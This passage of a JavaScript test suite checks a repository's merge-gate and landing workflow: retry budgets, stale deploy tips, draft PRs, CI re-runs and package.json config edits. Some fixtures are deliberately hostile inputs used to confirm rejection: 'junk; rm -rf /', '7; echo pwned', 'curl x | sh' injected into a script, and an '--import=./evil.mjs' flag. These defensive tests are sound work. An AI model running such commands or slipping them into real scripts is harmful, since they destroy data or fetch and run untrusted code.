  assert.equal(r.status, 0, r.stderr);
  assert.equal(r.out.retry, undefined);
  assert.equal(r.stderr.split("\n")[0], cleanErr);
  const merges = r.calls.filter((c) => c.includes("pr merge "));
  assert.equal(merges.length, 2, "auto attempt then one direct merge");
  assert.equal(merges[0], `gh pr merge 7 --repo o/r --auto --merge --match-head-commit ${HEAD7}`);
  assert.equal(merges[1], `gh pr merge 7 --repo o/r --merge --match-head-commit ${HEAD7}`);
  assert.equal(r.calls.filter((c) => c.includes("/branches/")).length, 2, "re-reads deploy tip");
  assert.equal(r.calls.filter((c) => c.includes("/pulls/7")).length, 2, "re-reads PR vetoes");
  assert.equal(r.summary, `merged #7 @ ${HEAD7.slice(0, 12)} onto ${TIP_A.slice(0, 12)} with LAND_TOKEN (PR was already CLEAN; auto-merge refused)\n`);
  r = go({ NOW_TIP_CLEAN: TIP_B });
  assert.equal(r.status, 0, r.stderr);
  assert.deepEqual(JSON.parse(r.out.retry), { number: 7, head: HEAD7 });
  assert.equal(r.calls.filter((c) => c.includes("pr merge ")).length, 1, "tip moved: no direct merge");
  r = go({ FAKE_PR_AFTER: pr7({ labels: [{ name: "land" }, { name: "hold" }] }) });
  assert.equal(r.status, 0, r.stderr);
  assert.equal(r.out.retry, undefined);
  assert.equal(r.calls.filter((c) => c.includes("pr merge ")).length, 1, "hold set: no direct merge");
  r = go({ GH_MERGE_RC2: "17", GH_MERGE_STDERR2: "GraphQL: Base branch was modified. Review and try the merge again. (mergePullRequest)", NOW_TIP_AFTER: TIP_B });
  assert.equal(r.status, 0, r.stderr);
  assert.deepEqual(JSON.parse(r.out.retry), { number: 7, head: HEAD7 }, "direct merge base-modified falls through to re-gate");
  assert.equal(r.calls.filter((c) => c.includes("pr merge ")).length, 2);
});

test("--trusted: an empty deploy tip is an error, never a row that passes (#4625)", () => {
  const f = fakes();
  const req = (p) => (p === "branches/deploy-x" ? { json: { commit: { sha: "" } } } : f.deps.request(p));
  const v = evaluate({ pr: 7, ...f.deps, request: req, trusted: true });
  assert.match(v.error || "", /no tip sha/);
  assert.equal(v.ok, undefined);
  assert.equal(main(["--pr", "7", "--sha", HEAD, "--trusted"], { ...f.deps, request: req, log: () => {} }) !== 0, true, "the CLI exits non-zero");
});

test("land.yml post: an empty tip on either leg is refused and re-gated, not equal to another empty tip (#4625)", () => {
  const run = LAND.jobs.post.steps.find((s) => s.id === "post").run;
  assert.match(run, /\[ -z "\$ttip" \] \|\| \[ -z "\$tip" \][^\n]*\n[^\n]*\n\s*code=1; line="a gate leg returned no deploy tip[^\n]*\n\s*want_retry "\$n" "\$head"/);
  assert.ok(run.indexOf('-z "$ttip"') < run.indexOf('"$ttip" != "$tip"'), "the empty check runs before the equality check");
});

test("land.yml post: the two tip moves (trusted-rows vs land-gate, verdict vs deploy tip) are handed to retry; other errors are not", () => {
  const run = LAND.jobs.post.steps.find((s) => s.id === "post").run;
  assert.match(run, /the deploy tip moved between trusted-rows[^\n]*\n\s*#[^\n]*\n\s*want_retry "\$n" "\$head"/,
    "the trusted-rows/land-gate tip split asks for a re-gate");
  assert.match(run, /elif \[ "\$now" != "\$tip" \]; then\n[^\n]*deploy tip moved since the gate measured[^\n]*\n\s*want_retry "\$n" "\$head"/,
    "a verdict whose tip is no longer the deploy tip asks for a re-gate");
  assert.equal((run.match(/^\s*want_retry "/gm) || []).length, 4, "no other branch asks for a re-gate");
  assert.equal((run.match(/retry=\$\(jq/g) || []).length, 1, "one append, inside want_retry");
  assert.match(run, /echo "retry=\$retry"/);
});

test("land.yml post (STALE TIP): success only onto the tip the gate measured; a moved tip writes pending, re-gates and disarms", () => {
  const run = LAND.jobs.post.steps.find((s) => s.id === "post").run;
  const ok0 = run.indexOf("0) #");
  assert.ok(ok0 > 0 && run.indexOf(`branches/$DEPLOY_BRANCH`, ok0) > ok0 && run.indexOf(`branches/$DEPLOY_BRANCH`, ok0) < run.indexOf("write_gate \"$head\" completed success", ok0),
    "the deploy tip is read after the verdict and before the success write");
  const line = `= merge-gate passed — open=ok hold=ok plan=ok ci=ok config=ok raise=ok pr=#7 sha=${HEAD7} tip=${TIP_A}`;
  const verdict = (code = 0) => ({ "verdicts/7.json": JSON.stringify({ number: 7, head: HEAD7, code, line, tip: TIP_A, out: "rows" }) });
  const env = (o = {}) => ({ GH_TOKEN: "t", DISARM_TOKEN: "lt", PRS: JSON.stringify([{ number: 7, head: HEAD7 }]), NOTASKED: "[]", DISARM: "[]",
    PAUSED: "false", AT: "2026-10-27T10:00:05Z", TRUSTED: JSON.stringify([{ number: 7, head: HEAD7, code: 0, line, tip: TIP_A }]),
    FAKE_PR: pr7(), FAKE_RUNS: JSON.stringify({ workflow_runs: [{ path: ".github/workflows/ci.yml", check_suite_id: 1 }] }),
    FAKE_CHECKS: JSON.stringify({ check_runs: [{ id: 1, app: { slug: "github-actions" }, check_suite: { id: 1 }, conclusion: "success" }] }), ...o });
  const bodies = (r) => r.calls.filter((c) => c.startsWith("body ")).map((c) => JSON.parse(c.slice(5)));
  const disarmed = (r) => r.calls.some((c) => c === "gh pr merge 7 --repo o/r --disable-auto");
  const armed = pr7({ auto_merge: { merge_method: "merge" } });

  let r = runStep(run, env({ NOW_TIP: TIP_A }), verdict());
  assert.equal(r.status, 0, r.stderr);
  assert.deepEqual(bodies(r).map((b) => b.state), ["success"], "the tip is unchanged: success");
  assert.deepEqual(JSON.parse(r.out.arm), { number: 7, head: HEAD7, tip: TIP_A });
  assert.equal(r.out.retry, "[]");
  assert.equal(disarmed(r), false);

  r = runStep(run, env({ NOW_TIP: TIP_B, FAKE_PR: armed }), verdict());
  assert.equal(r.status, 0, r.stderr);
  assert.deepEqual(bodies(r).map((b) => b.state), ["pending"], "#3982: a success measured on an older tip is never written");
  assert.match(bodies(r)[0].description, new RegExp(`deploy tip moved since the gate measured ${TIP_A.slice(0, 12)} \\(now ${TIP_B.slice(0, 12)}\\)`));
  assert.equal(r.out.arm, "", "nothing armed onto an ungated tip");
  assert.deepEqual(JSON.parse(r.out.retry), [{ number: 7, head: HEAD7 }], "re-gated at once through retry (RETRY_MAX per head)");
  assert.equal(disarmed(r), true, "an auto-merge armed earlier would fire on the next success: disarmed");

  r = runStep(run, env({ NOW_TIP: TIP_B }), verdict());
  assert.deepEqual(JSON.parse(r.out.retry), [{ number: 7, head: HEAD7 }]);
  assert.equal(disarmed(r), false, "not armed: nothing to disarm");

  r = runStep(run, env({ NOW_TIP: TIP_A, FAKE_PR: armed, TRUSTED: JSON.stringify([{ number: 7, head: HEAD7, code: 3, line: "= merge-gate waiting", tip: TIP_A }]) }), verdict());
  assert.deepEqual(bodies(r).map((b) => b.state), ["pending"]);
  assert.equal(disarmed(r), true, "any non-success write disarms an armed PR");
  assert.equal(r.out.retry, "[]", "CI still running is not a tip move");

  r = runStep(run, env({ NOW_TIP: TIP_A, FAKE_PR: armed, TRUSTED: "[]" }), verdict());
  assert.equal(r.status, 0, r.stderr);
  assert.deepEqual(bodies(r).map((b) => b.state), ["pending"], "missing trusted rows cannot approve the head");
  assert.deepEqual(JSON.parse(r.out.retry), [{ number: 7, head: HEAD7 }], "missing trusted rows request the bounded re-gate");
  assert.equal(r.out.arm, "", "missing trusted rows cannot arm");
  assert.equal(disarmed(r), true, "an earlier arm is disarmed while trusted verification is missing");

  r = runStep(run, env({ NOW_TIP: TIP_A, FAKE_PR: armed, TRUSTED: "[]" }), verdict(2));
  assert.equal(r.status, 0, r.stderr);
  assert.deepEqual(bodies(r).map((b) => b.state), ["failure"], "an actual land-gate refusal stays a refusal even without trusted rows");
  assert.equal(r.out.retry, "[]", "missing rows cannot turn a gen/ratchet refusal into a retry");
  assert.equal(r.out.arm, "");

  r = runStep(run, env({ NOW_TIP: TIP_B, FAKE_PR: armed, FAKE_RUN: JSON.stringify({ path: ".github/workflows/land.yml", event: "workflow_run", head_branch: DEPLOY_BRANCH }),
    FAKE_STATUSES: JSON.stringify([{ context: "gate", created_at: "2026-10-27T10:00:09Z", target_url: "https://github.com/o/r/actions/runs/2", creator: { login: "github-actions[bot]" } }]) }), verdict());
  assert.deepEqual(bodies(r), [], "a newer verdict on the head from another land.yml run is kept");
  assert.equal(disarmed(r), false, "and its run owns the arm state");
});

test("land.yml retry: dispatches each PR once on the deploy branch with attempt+1, and stops at RETRY_MAX", () => {
  const run = LAND.jobs.retry.steps[0].run;
  const go = (attempt, post, arm, extra = {}) => runStep(run, { ATTEMPT: attempt, POST_RETRY: post, ARM_RETRY: arm, ...extra });
  const item = JSON.stringify({ number: 7, head: HEAD7 });
  let r = go("0", `[${item}]`, item);
  assert.equal(r.status, 0, r.stderr);
  const posts = r.calls.filter((c) => c.includes("--method POST"));
  assert.equal(posts.length, 1, "post and arm naming one PR dispatch once");
  assert.equal(posts[0], `gh api --method POST repos/o/r/actions/workflows/land.yml/dispatches -f ref=${DEPLOY_BRANCH} -f inputs[pr]=7 -f inputs[head]=${HEAD7} -f inputs[attempt]=1`);
  r = go(String(Number(LAND.env.RETRY_MAX) - 1), "", item);
  assert.match(r.calls.find((c) => c.includes("--method POST")) || "", new RegExp(`inputs\\[attempt\\]=${LAND.env.RETRY_MAX}$`));
  r = go(String(LAND.env.RETRY_MAX), `[${item}]`, "");
  assert.equal(r.status, 0, r.stderr);
  assert.equal(r.calls.length, 0, "budget spent: nothing dispatched, the next train re-gates");
  r = go("junk; rm -rf /", `[${item}]`, "");
  assert.match(r.calls[0], /inputs\[attempt\]=1$/, "a malformed attempt counts as 0, never runs");
  r = go("0", `[${item}]`, "", { GH_POST_RC: "1" });
  assert.equal(r.status, 0, "a failed dispatch warns and leaves the next train to re-gate");
});

test("land.yml resolve: a dispatched re-gate is one PR, validated, and its budget resets when the head moved", () => {
  const run = LAND.jobs.resolve.steps.find((s) => s.id === "pick").run;
  const go = (env) => runStep(run, { EVENT: "workflow_dispatch", PR_NUMBER: "", RUN_CONCLUSION: "", RUN_BRANCH: "", RUN_REPO: "", RUN_SHA: "", CANDIDATES: "null", FAKE_PR: pr7(), ...env });
  let r = go({ IN_PR: "7", IN_HEAD: HEAD7, IN_ATTEMPT: "2" });
  assert.equal(r.status, 0, r.stderr);
  assert.equal(r.out.landable, "true");
  assert.deepEqual(JSON.parse(r.out.prs), [{ number: 7, head: HEAD7 }]);
  assert.equal(r.out.attempt, "2");
  r = go({ IN_PR: "7", IN_HEAD: "e".repeat(40), IN_ATTEMPT: "2" });
  assert.equal(r.out.attempt, "0", "a new head starts a new budget");
  r = go({ IN_PR: "7", IN_HEAD: HEAD7, IN_ATTEMPT: "2", FAKE_PR: pr7({ labels: [{ name: "land" }, { name: "hold" }] }) });
  assert.equal(r.out.landable, "false");
  assert.equal(JSON.parse(r.out.notasked)[0].why, "the `hold` label is set", "resolved like a label event: a hold turns gate red");
  r = go({ IN_PR: "7; echo pwned", IN_HEAD: "", IN_ATTEMPT: "0" });
  assert.notEqual(r.status, 0, "a non-numeric pr input is refused");
  r = go({ EVENT: "pull_request_target", PR_NUMBER: "7", IN_PR: "", IN_HEAD: "", IN_ATTEMPT: "" });
  assert.equal(r.out.attempt, "0", "every other event starts at 0");
});

// ---- AUTO-SYNC retired 2026-11-03 with merge-gate's distance row (plan §6): land.yml never update-branches ----------

test("land.yml has no sync job, no SYNC_MAX, no sync input and no update-branch call; a train re-gate skips a failed gate without syncing it", () => {
  assert.equal(LAND.jobs.sync, undefined, "the AUTO-SYNC job is gone");
  assert.equal(LAND.env.SYNC_MAX, undefined);
  assert.equal(LAND.on.workflow_dispatch.inputs.sync, undefined);
  const text = fs.readFileSync(path.join(ROOT, ".github/workflows/land.yml"), "utf8");
  assert.doesNotMatch(text, /update-branch"|distance_only|IN_SYNC|AUTO-SYNC candidate/, "no update-branch caller or distance sweep is left");
  assert.doesNotMatch(text, /CI ignored/, "the ci.yml noise-run title filter went with the run-ci opt-in");
  const RESOLVE_RUN = LAND.jobs.resolve.steps.find((s) => s.id === "pick").run;
  const hx = (c) => c.repeat(40);
  const H = { 7: HEAD7, 11: hx("f") };
  const pr = (n) => ({ number: n, state: "open", draft: false, base: { ref: DEPLOY_BRANCH }, head: { sha: H[n], repo: { full_name: "o/r" } },
    auto_merge: null, created_at: `2026-10-27T${String(n).padStart(2, "0")}:00:00Z`, labels: [{ name: "land" }] });
  const prs = { 7: pr(7), 11: pr(11) };
  const statuses = { [H[7]]: [{ id: 107, context: "gate", state: "failure", description: `= merge-gate refused — open=ok hold=ok plan=ok ci=ok config=FAIL pr=#7 sha=${H[7]} tip=${TIP_A}` }],
    [H[11]]: [{ id: 111, context: "gate", state: "pending", description: "= merge-gate waiting" }] };
  const r = runStep(RESOLVE_RUN, { EVENT: "workflow_run", RUN_BRANCH: DEPLOY_BRANCH, RUN_REPO: "o/r", RUN_CONCLUSION: "success", RUN_SHA: "", CANDIDATES: "null",
    PR_NUMBER: "", IN_PR: "", IN_HEAD: "", IN_ATTEMPT: "", FAKE_LANDS: JSON.stringify([{ number: 7 }, { number: 11 }]), FAKE_PRS: JSON.stringify(prs), FAKE_STATUSES: JSON.stringify(statuses) });
  assert.equal(r.status, 0, r.stderr);
  assert.deepEqual(JSON.parse(r.out.prs), [{ number: 11, head: H[11] }], "a head whose gate is not failure is re-gated by the train");
  assert.match(r.stdout, /PR #7: gate is already failure/);
  assert.equal(r.out.sync, undefined, "resolve emits no sync list");
  const disp = (inputs) => ({ event_name: "workflow_dispatch", ref: `refs/heads/${DEPLOY_BRANCH}`, run_id: 9, event: { inputs } });
  assert.equal(ghExpr(LAND.concurrency.group, disp({ pr: "7" })), "land-7");
});

// ---- 2026-10-30 landing gaps: edited body, draft + land, the stale-gate sweep, ship-pr --------------------------

test("land.yml edited: only a BODY edit on a `land` PR re-gates; a title edit runs alone in a noise group and resolve skips it", () => {
  const prt = (action, changes, labels = ["land"]) => ({ event_name: "pull_request_target", run_id: 99,
    event: { action, changes, pull_request: { number: 7, labels: labels.map((name) => ({ name })) } } });
  assert.ok(ghExpr(LAND.jobs.resolve.if, prt("edited", { body: { from: "x" } })), "a body edit re-gates");
  assert.ok(!ghExpr(LAND.jobs.resolve.if, prt("edited", { title: { from: "x" } })), "a title edit does not");
  assert.ok(!ghExpr(LAND.jobs.resolve.if, prt("edited", { body: { from: "x" } }, [])), "a PR without `land` is not re-gated by an edit");
  const group = (github) => ghExpr(LAND.concurrency.group, github);
  assert.equal(group(prt("edited", { title: { from: "x" } })), "land-noise-99", "a title edit never cancels the PR's evaluation");
  assert.equal(group(prt("edited", { body: { from: "x" } })), "land-7");
  assert.equal(ghExpr(LAND.concurrency.group, { event_name: "schedule", run_id: 4, event: {} }), "land-stale-sweep");
});

test("land.yml post: `land` on a draft writes a gate failure naming the flip, and comments once per head", () => {
  const run = LAND.jobs.post.steps.find((s) => s.id === "post").run;
  const row = JSON.stringify([{ number: 7, head: HEAD7, why: "the PR is a draft", draft: true }]);
  const env = (o = {}) => ({ GH_TOKEN: "t", DISARM_TOKEN: "t", PRS: "[]", NOTASKED: row, DISARM: "[]", PAUSED: "false", AT: "2026-10-30T10:00:05Z", TRUSTED: "[]", FAKE_PR: pr7({ draft: true }), ...o });
  const bodies = (r) => r.calls.filter((c) => c.startsWith("body ")).map((c) => JSON.parse(c.slice(5)));
  let r = runStep(run, env());
  assert.equal(r.status, 0, r.stderr);
  const [status, comment] = bodies(r);
  assert.equal(status.state, "failure");
  const prefix = "= merge-gate not asked — draft: flip ready first — ready-gate, then update_pull_request draft:false";
  assert.equal(status.description.slice(0, prefix.length), prefix);
  assert.ok(status.description.length <= 140);
  assert.equal(comment.body.split("\n")[0], `<!-- land-draft:${HEAD7} -->`);
  r = runStep(run, env({ FAKE_COMMENTS: JSON.stringify([{ body: `<!-- land-draft:${HEAD7} -->\nold` }]) }));
  assert.equal(bodies(r).length, 1, "the comment for this head already exists: only the status is written");
  r = runStep(run, env({ NOTASKED: JSON.stringify([{ number: 7, head: HEAD7, why: "no `land` label", draft: false }]) }));
  assert.equal(bodies(r).length, 0, "a plain not-asked PR with no gate status still posts nothing");
});

test("land.yml sweep: re-gates a land PR whose gate is older than its green CI (or pending after it), bounded by STALE_MAX and RETRY_MAX", () => {
  const job = LAND.jobs.sweep;
  assert.deepEqual(job.permissions, { actions: "write", "pull-requests": "read", issues: "read", statuses: "read" });
  assert.ok(!runsRepoCode(job) && !usesSecret(job), "no PR code, no secret");
  assert.equal(ghExpr(job.if, { event_name: "schedule" }), true);
  const disp = (stale, ref = `refs/heads/${DEPLOY_BRANCH}`) => ({ event_name: "workflow_dispatch", ref, event: { inputs: { stale } } });
  assert.equal(ghExpr(job.if, { event_name: "pull_request_target" }), false);
  assert.deepEqual([ghExpr(job.if, disp("true")), ghExpr(job.if, disp("false")), ghExpr(job.if, disp("true", "refs/heads/cursor/x"))], [true, false, false], "a stale=true dispatch on the deploy branch runs the sweep, on no other ref");
  assert.deepEqual([ghExpr(LAND.jobs.resolve.if, disp("true")), ghExpr(LAND.jobs.resolve.if, disp("false"))], [false, true], "a stale dispatch is not a PR re-gate");
  assert.equal(ghExpr(LAND.concurrency.group, { ...disp("true"), run_id: 4 }), "land-stale-sweep");
  assert.ok(LAND.on.schedule[0].cron);
  const run = job.steps[0].run;
  // The sweep reads the real clock, so the fixture times are relative to it: "now" is minute 40.
  const base = Math.floor((Date.now() - 40 * 60000) / 60000) * 60000;
  const T = (m) => new Date(base + m * 60000).toISOString().replace(".000Z", "Z");
  const lands = (n = 1) => JSON.stringify(Array.from({ length: n }, (_, i) => ({ number: 7 + i, headRefOid: String(i + 1).repeat(40), isDraft: false, labels: [{ name: "land" }] })));
  const ci = (o = {}) => JSON.stringify({ workflow_runs: [{ status: "completed", conclusion: "success", display_title: "CI", created_at: T(0), updated_at: T(30), ...o }] });
  const st = (...a) => JSON.stringify(a.map(([state, m]) => ({ context: "gate", state, created_at: T(m) })));
  const go = (env) => runStep(run, { FAKE_LANDS: lands(), FAKE_RUNS: ci(), FAKE_STATUSES: st(["pending", 20]), STALE_MAX: "4", ...env });
  const dispatched = (r) => r.calls.filter((c) => c.includes("--method POST") && c.includes("land.yml/dispatches"));
  let r = go({});
  assert.equal(r.status, 0, r.stderr);
  assert.equal(dispatched(r).length, 1, "gate older than CI: re-gated");
  assert.equal(dispatched(r)[0], `gh api --method POST repos/o/r/actions/workflows/land.yml/dispatches -f ref=${DEPLOY_BRANCH} -f inputs[pr]=7 -f inputs[head]=${"1".repeat(40)} -f inputs[attempt]=0`);
  const one = { number: 7, headRefOid: "1".repeat(40), isDraft: false, labels: [{ name: "land" }] };
  const cases = [
    [{ FAKE_STATUSES: st(["success", 40]) }, 0, "a gate newer than CI is current"],
    [{ FAKE_STATUSES: st(["failure", 40]) }, 0, "a newer failure is a verdict, not stale"],
    [{ FAKE_RUNS: ci({ status: "in_progress", conclusion: null }) }, 0, "CI still running: the gate is rightly waiting"],
    [{ FAKE_RUNS: ci({ conclusion: "failure" }) }, 0, "no green CI: nothing to re-gate for"],
    [{ FAKE_STATUSES: "[]" }, 1, "a land PR with no gate at all is re-gated"],
    [{ FAKE_STATUSES: st(["pending", 31]) }, 0, "a gate written after CI is current until it has been pending 15 min"],
    [{ FAKE_STATUSES: st(["failure", 33], ["pending", 32], ["pending", 31], ["pending", 20]) }, 0, "RETRY_MAX re-gates since CI finished spent the budget"],
    [{ FAKE_LANDS: lands(6), STALE_MAX: "2" }, 2, "at most STALE_MAX per run"],
    [{ PAUSED: "true" }, 0, "merge-pause: nothing"],
    [{ FAKE_LANDS: JSON.stringify([{ ...one, isDraft: true }]) }, 0, "a draft is never swept"],
    [{ FAKE_LANDS: JSON.stringify([{ ...one, labels: [{ name: "land" }, { name: "hold" }] }]) }, 0, "hold is never swept"],
  ];
  for (const [env, want, why] of cases) assert.equal(dispatched(go(env)).length, want, why);
  assert.equal(go({ GH_POST_RC: "1" }).status, 0, "a failed dispatch warns, never fails the sweep");
});

test("ci retry: a CI that went green only on a re-run after a failed job fails the row; a first-attempt pass or a re-run after a cancel passes", () => {
  const jobs = { 1: [{ name: "Structural guards", conclusion: "failure" }, { name: "lint", conclusion: "success" }], 2: [{ name: "x", conclusion: "cancelled" }] };
  const req = (p) => { const m = /^actions\/runs\/900\/attempts\/(\d+)\/jobs/.exec(p); return m ? { json: { jobs: jobs[m[1]] || [] } } : { error: `unexpected ${p}` }; };
  assert.equal(ciRetryVerdict({ id: 900, run_attempt: 1 }, req).ok, true);
  assert.equal(ciRetryVerdict(undefined, req).ok, true, "no run known: the suite pin already decided");
  const red = ciRetryVerdict({ id: 900, run_attempt: 2 }, req);
  assert.deepEqual(red, { ok: false, evidence: "CI passed only on re-run 2 of ci.yml run 900: Structural guards (attempt 1: failure) failed before — a pass that needed a retry is a red: push a fresh commit, or quarantine the test by name in tests/data/flaky-quarantine.json" });
  jobs[1] = [{ name: "x", conclusion: "cancelled" }];
  assert.equal(ciRetryVerdict({ id: 900, run_attempt: 3 }, req).ok, true, "earlier attempts only cancelled");
  assert.equal(ciRetryVerdict({ id: 900, run_attempt: 2 }, () => ({ error: "HTTP 502" })).error, "jobs of ci.yml run 900 attempt 1: HTTP 502");
  // evaluate: the green CI check-run's suite is a re-run with a failed first attempt.
  const f = fakes();
  f.runs[0].id = 900; f.runs[0].run_attempt = 2;
  jobs[1] = [{ name: "Structural guards", conclusion: "failure" }];
  const rq = (p) => (p.startsWith("actions/runs/900/") ? req(p) : f.deps.request(p));
  assert.deepEqual(ROWS.filter((k) => !evaluate({ pr: 7, ...f.deps, request: rq }).rows[k].ok), ["ci", "retest"]);
  f.runs[0].run_attempt = 1;
  assert.equal(evaluate({ pr: 7, ...f.deps, request: rq }).ok, true);
});

test("config: a package.json diff that is only the generated test file lists is not a config edit; any other package.json edit is", async () => {
  const { renderPkg } = await import("../../tools/gen/gen-test-groups.mjs");
  const groups = (files, extra = {}) => JSON.stringify({ groups: { "test:a": { kind: "node", files }, "test:c": { kind: "command", cmd: "node x.mjs" }, ...extra } });
  const basePkgObj = { name: "x", scripts: { gen: "node tools/gen/gen-test-groups.mjs", "test:a": "", "test:c": "" } };
  const basePkg = renderPkg(JSON.parse(groups(["tests/unit/season-cal.test.mjs"])), JSON.stringify(basePkgObj, null, 2) + "\n");
  const baseGroups = groups(["tests/unit/season-cal.test.mjs"]);
  const headGroups = groups(["tests/unit/season-cal.test.mjs", "tests/unit/badges.test.mjs"]);
  const headPkg = renderPkg(JSON.parse(headGroups), basePkg);
  assert.deepEqual(generatedPkgVerdict({ basePkg, headPkg, baseGroups, headGroups }), { ok: true, evidence: "package.json changes only generated test file lists (test:a)" });
  const edited = headPkg.replace('"gen": "node', '"gen": "curl x | sh; node');
  assert.equal(generatedPkgVerdict({ basePkg, headPkg: edited, baseGroups, headGroups }).ok, false, "a non-test script edit");
  const cmdGroups = groups(["tests/unit/season-cal.test.mjs"]).replace("node x.mjs", "node y.mjs");
  assert.equal(generatedPkgVerdict({ basePkg, headPkg: renderPkg(JSON.parse(cmdGroups), basePkg), baseGroups, headGroups: cmdGroups }).evidence,
    "script test:c: its group's kind or flags changed (only file lists are generated data)", "a command group is never generated data");
  const flagGroups = JSON.stringify({ groups: { ...JSON.parse(headGroups).groups, "test:a": { kind: "node", flags: ["--import=./evil.mjs"], files: ["tests/unit/season-cal.test.mjs"] } } });
  assert.equal(generatedPkgVerdict({ basePkg, headPkg: renderPkg(JSON.parse(flagGroups), basePkg), baseGroups, headGroups: flagGroups }).ok, false, "a flag change");
  assert.equal(generatedPkgVerdict({ basePkg, headPkg, baseGroups, headGroups: "{" }).ok, false, "unparseable fails closed");
  assert.equal(generatedPkgVerdict({ basePkg, headPkg, baseGroups, headGroups, render: () => { throw new Error("boom"); } }).evidence, "the test-groups generator refused the head's tests/groups.json: boom");
  // evaluate: the PR's only config path is that generated package.json → the config row passes without config-ok.
  const f = fakes();
  f.files.push({ filename: "package.json" }, { filename: "tests/groups.json" });
  const b64 = (t) => ({ json: { encoding: "base64", content: Buffer.from(t).toString("base64") } });
  const at = { [`contents/package.json?ref=${"m".repeat(40)}`]: b64(basePkg), [`contents/package.json?ref=${HEAD}`]: b64(headPkg),
    [`contents/tests/groups.json?ref=${"m".repeat(40)}`]: b64(baseGroups), [`contents/tests/groups.json?ref=${HEAD}`]: b64(headGroups) };
  const rq = (pkgAtHead) => (p) => p.startsWith("compare/deploy-x...") ? { json: { merge_base_commit: { sha: "m".repeat(40) } } }
    : p === `contents/package.json?ref=${HEAD}` ? b64(pkgAtHead) : at[p] || f.deps.request(p);
  const ok = evaluate({ pr: 7, ...f.deps, request: rq(headPkg) });
  assert.equal(ok.rows.config.ok, true, ok.rows.config.evidence);
  assert.equal(ok.rows.config.evidence.endsWith("; package.json changes only generated test file lists (test:a)"), true);
  const bad = evaluate({ pr: 7, ...f.deps, request: rq(edited) });
  assert.equal(bad.rows.config.evidence, "needs config-ok from brycejmurrin: the diff edits package.json; package.json counted as a config edit: package.json carries edits the test-groups generator does not reproduce");
  const noMb = evaluate({ pr: 7, ...f.deps, request: (p) => (p.startsWith("compare/") ? { error: "HTTP 404" } : rq(headPkg)(p)) });
  assert.equal(noMb.rows.config.ok, false, "an unreadable merge base fails closed");
});

// ---- #5407 option (b), Bryce 2026-11-11 ~09:02Z "Quick re-test at merge (Recommended)" ---------------------------

/** A fixture unit-test path no tree carries, built so the source-path lint does not read it as a reference. */
const U = (name) => ["tests", "unit", `${name}.test.mjs`].join("/");

test("#5407 retest: a tip merge newer than the CI run's base re-runs the unit tests it touched on the merge result; red, timeout or unreadable refuses", () => {
  const T = scratch("merge-gate-retest-");
  const at = (iso) => ({ ...process.env, GIT_COMMITTER_DATE: iso, GIT_AUTHOR_DATE: iso });
  const git = (cwd, env, ...a) => { const r = spawnSync("git", ["-c", "user.email=t@t", "-c", "user.name=t", ...a], { cwd, encoding: "utf8", env }); assert.equal(r.status, 0, `${a.join(" ")}: ${r.stderr}`); return r.stdout.trim(); };
  const write = (rel, text) => { fs.mkdirSync(path.dirname(path.join(W, rel)), { recursive: true }); fs.writeFileSync(path.join(W, rel), text); };
  const W = path.join(T, "w");
  try {
    fs.mkdirSync(W);
    git(W, at("2026-11-11T00:00:00Z"), "init", "-q", "-b", "deploy-x");
    write("tools/check/offline-precache-check.cjs", "// v1\n"); write("tests/unit/tools-runnable.test.mjs", "// v1\n"); write(U("old"), "// v1\n");
    git(W, at("2026-11-11T00:00:00Z"), "add", "-A"); git(W, at("2026-11-11T00:00:00Z"), "commit", "-q", "-m", "base");
    // The PR (#5300's shape): adds usage lines to the tool, CI runs at 01:00.
    git(W, at("2026-11-11T00:30:00Z"), "checkout", "-q", "-b", "pr");
    write("tools/check/offline-precache-check.cjs", "// v1 + two usage lines\n");
    git(W, at("2026-11-11T00:30:00Z"), "commit", "-q", "-am", "the PR");
    const head = git(W, undefined, "rev-parse", "HEAD");
    git(W, undefined, "checkout", "-q", "deploy-x");
    // A tip commit well before the CI run (outside the margin) was in its merge ref: nothing to re-test.
    write(U("old"), "// v2\n"); git(W, at("2026-11-11T00:20:00Z"), "commit", "-q", "-am", "old merge");
    const ciAt = "2026-11-11T01:00:00Z";
    const calls = [];
    const run = (cmd, argv, opts) => { calls.push({ cmd, argv, cwd: opts.cwd, env: opts.env }); return { status: 0, stdout: "", stderr: "" }; };
    const select = (paths) => ({ files: paths.filter((f) => f.startsWith("tests/unit/")), reason: "matched" });
    let tip = git(W, undefined, "rev-parse", "HEAD");
    const quiet = retestOnMerge({ cwd: W, tip, head, ciAt, run, select });
    assert.equal(quiet.ok, true, quiet.evidence);
    assert.equal(quiet.evidence, "no tip merge since the CI run's base (created 2026-11-11T01:00:00Z, margin 15 min; no recorded base): CI tested this combination");
    assert.equal(calls.length, 0, "nothing runs when CI tested this combination");
    // #5392's shape lands AFTER the CI run: it pins the tool's --help as exact text (the test file changes).
    write("tests/unit/tools-runnable.test.mjs", "// v2: exact two-line --help\n"); git(W, at("2026-11-11T01:44:54Z"), "commit", "-q", "-am", "#5392");
    tip = git(W, undefined, "rev-parse", "HEAD");
    const t = newerTipPaths({ cwd: W, tip, head, ciAt });
    assert.deepEqual([t.commits.length, t.newer, t.pr], [1, ["tests/unit/tools-runnable.test.mjs"], ["tools/check/offline-precache-check.cjs"]]);
    const green = retestOnMerge({ cwd: W, tip, head, ciAt, run, select });
    assert.equal(green.ok, true, green.evidence);
    assert.equal(calls.length, 1);
    assert.deepEqual(calls[0].argv, ["tools/ci/tooling-fast.mjs", "--jobs=2", "--quiet", "--file-timeout=180", "tests/unit/tools-runnable.test.mjs"], "the merge result's tooling-fast runs the touched test");
    assert.equal(calls[0].cwd, W);
    assert.equal(calls[0].env.GITHUB_TOKEN, undefined, "the PR's code runs with the stripped environment");
    assert.equal(green.evidence, `1 tip merge(s) since the CI run (${tip.slice(0, 8)}); 1 unit file(s) re-tested on the merge result (tooling-fast's --changed selection (matched)): tests/unit/tools-runnable.test.mjs passed`);
    // The crossing itself: the re-test is red on the merge → refused (deploy red #5396 would not have happened).
    const red = retestOnMerge({ cwd: W, tip, head, ciAt, select, run: () => ({ status: 1, stdout: "[tooling-fast] FAIL  1/1 tests/unit/tools-runnable.test.mjs exit=1\n", stderr: "" }) });
    assert.equal(red.ok, false);
    assert.equal(red.evidence, `1 tip merge(s) since the CI run (${tip.slice(0, 8)}); the re-test of 1 unit file(s) on the merge onto ${tip.slice(0, 8)} failed: [tooling-fast] FAIL  1/1 tests/unit/tools-runnable.test.mjs exit=1 — the PR and the newer tip cross; sync-pr.mjs, fix, and push (a fresh CI run)`);
    const slow = retestOnMerge({ cwd: W, tip, head, ciAt, select, run: () => ({ status: null, error: Object.assign(new Error("spawnSync node ETIMEDOUT"), { code: "ETIMEDOUT" }) }) });
